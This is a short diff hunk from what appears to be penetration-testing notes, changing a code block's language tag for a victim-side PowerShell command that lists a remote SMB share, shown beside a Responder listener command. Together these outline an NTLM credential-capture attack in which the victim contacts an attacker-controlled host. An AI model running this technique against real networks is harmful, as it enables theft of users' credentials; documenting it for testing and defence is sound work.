@@ -211,7 +211,7 @@ python Responder.py -I interface
 ```
 
 Client (victim):
-```bash
+```powershell
 gci \\ip\test\test
 ```
 
